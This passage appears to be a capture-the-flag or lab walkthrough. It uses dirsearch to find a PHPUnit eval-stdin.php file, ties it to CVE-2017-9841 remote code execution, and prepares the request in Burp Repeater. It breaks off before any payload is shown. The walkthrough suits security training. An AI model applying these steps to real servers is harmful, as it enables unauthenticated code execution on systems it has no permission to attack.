cd dirsearch
pip3 install -r requirements.txt

2. Ran dirsearch with 
python3 dirsearch.py -u http://34.179.196.165:31850 -w ./db/dicc.txt
and discovered two interesting files: /composer.json and /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

3. Visited http://34.179.196.165:31850/composer.json and saw that the application was using phpunit version 5.6.2, which is vulnerable to CVE-2017-9841

4. Learned that CVE-2017-9841 is a remote code execution vulnerability in PHPUnit where the eval-stdin.php file allows unauthenticated attackers to execute arbitrary PHP code by sending POST data

5. Opened Burp Suite, turned Intercept on, and navigated to http://34.179.196.165:31850/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php to capture the request

Burp steps: Go to proxy -> Intercept
Turn it on and then press "Open browser"
Paste in your link ur interested in
http://34.179.196.165:31850/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Right click anywhere in the request window. Select "Send to Repeater". Then turn Intercept off. Go to the Repeater tab. Click Send.
Later in repeater when you get a legit response, add this after 1 blank line
